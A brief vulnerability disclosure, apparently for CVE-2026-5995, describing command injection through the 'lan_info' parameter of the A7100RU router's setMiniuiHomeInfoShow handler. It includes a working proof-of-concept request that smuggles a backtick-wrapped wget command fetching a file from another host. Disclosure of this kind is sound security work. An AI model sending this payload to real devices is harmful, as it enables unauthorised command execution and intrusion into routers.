# A7100RU Vulnerability（CVE-2026-5995）
...
In  sub_4230E4  function, it reads in a user-provided parameter `lan_info` .

However ,the value of the `lan_info`  is inserted into `v9`  using `snprintf`,and the value of v9 will be handled by the function CsteSystem.
...
We set `lan_info` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setMiniuiHomeInfoShow","lan_info":"`wget 192.168.6.1:7777/testpoc`"
